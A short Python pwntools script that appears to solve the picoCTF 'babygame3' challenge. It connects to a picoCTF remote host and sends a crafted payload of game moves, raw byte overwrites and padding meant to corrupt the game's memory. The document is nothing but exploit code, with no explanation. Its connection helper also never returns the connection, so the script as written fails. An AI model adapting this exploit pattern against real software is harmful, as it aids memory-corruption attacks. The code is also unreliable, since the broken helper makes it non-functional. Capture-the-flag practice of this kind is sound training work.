#!/usr/bin/env python3

from pwn import *

e = ELF("/home/panther/Downloads/picoctf/babygame3/game")

context.binary = e
context(terminal=["tmux", "split-window", "-h"])
# gdb.attach(p) for a bkpt

def conn():
    p = remote("rhea.picoctf.net", 60866)

p = conn()

payload = b"aaaaaaaawwwwsp"*3 # get to level 4
payload += b"aaaaaaaawwwwsaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaal" # get to level 5
payload += b"\x70"
payload += b"w"

payload += b"l@aaaaaaaawwwwsl\xfe"

payload += b"a"*63

#gdb.attach(p)
p.sendline(payload)
p.interactive()
